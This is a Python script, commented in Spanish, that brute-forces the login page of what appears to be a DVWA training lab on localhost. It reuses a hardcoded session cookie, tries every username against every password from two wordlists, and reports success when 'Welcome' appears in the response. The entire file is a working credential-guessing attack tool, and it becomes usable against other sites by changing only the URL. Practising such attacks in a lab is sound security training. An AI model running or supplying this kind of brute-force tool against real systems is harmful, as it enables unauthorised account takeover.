import sys
import requests
import time


# -------- Config --------
BASE_URL = "http://localhost:3333/vulnerabilities/brute/"
DEFAULT_COOKIES = {"security": "low", "PHPSESSID": "816d744a018d21335e6b5a7c16902907"}
SEARCH_TERMS = ["Welcome", "Logout"]

# Códigos de color ANSI
GREEN = "\033[32m"
RESET = "\033[0m"
BLUE = "\033[34m"
# --------------------------------------------------


"""Intenta hacer login y busca términos de éxito en la respuesta"""
def attempt_login_and_scan(session, username, password):
    params = {"username": username, "password": password, "Login": "Login"}
    try:
        r = session.get(BASE_URL, params=params, allow_redirects=True, timeout=12)
    except Exception as e:
        return {"error": str(e)}
    text = r.text or ""
    found = find_terms_in_text(text, SEARCH_TERMS)
    return {
        "status_code": r.status_code,
        "text": text,
        "found": found,
        "cookies": session.cookies.get_dict()
    }

"""
Busca cualquiera de los términos (case-insensitive) y devuelve la primera coincidencia encontrada
como (term, start_index, end_index, matched_text), o None si no hay.
"""

def find_terms_in_text(text, terms):
    lower = text.lower()
    for t in terms:
        li = t.lower()
        idx = lower.find(li)
        if idx != -1:
            return (t, idx, idx + len(li), text[idx:idx+len(li)])
    return None


"""Carga la wordlist desde archivo"""
def load_wordlist(filename):
    try:
        with open(filename, "r", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: No se pudo encontrar el archivo {filename}")
        sys.exit(1)
    except Exception as e:
        print(f"Error al leer {filename}: {e}")
        sys.exit(1)


def main():
    if len(sys.argv) < 3:
        print("Uso: python3 scan_welcome.py usuarios.txt contraseñas.txt")
        print("Ejemplo: python3 scan_welcome.py users.txt passwords.txt")
        sys.exit(1)

    users_file = sys.argv[1]
    passwords_file = sys.argv[2]
    users = load_wordlist(users_file)
    passwords = load_wordlist(passwords_file)

    total_attempts = 0
    successful_logins = 0
    start_time = time.time()

    for user_idx, username in enumerate(users, 1):
        print(f"{BLUE}[Usuario {user_idx}/{len(users)}] Probando usuario: '{username}'{RESET}")

        for pw_idx, password in enumerate(passwords, 1):
            total_attempts += 1

            # Crear nueva sesión para cada intento
            s = requests.Session()
            for k, v in DEFAULT_COOKIES.items():
                s.cookies.set(k, v)

            res = attempt_login_and_scan(s, username, password)

            if "error" in res:
                print(f"  [{pw_idx}/{len(passwords)}] pw='{password}' ERROR: {res['error']}")
                continue

            found = res["found"]
            if found:
                term, start_idx, end_idx, matched_text = found
                # Solo mostrar en verde si el término es "Welcome" (case insensitive)
                if term.lower() == "welcome":
                    print(f"  {GREEN}[{pw_idx}/{len(passwords)}] EJO! user='{username}' pw='{password}' term='{term}'{RESET}")
                    successful_logins += 1
                else:
                    print(f"  [{pw_idx}/{len(passwords)}] user='{username}' pw='{password}' term='{term}'")


if __name__ == "__main__":
    main()
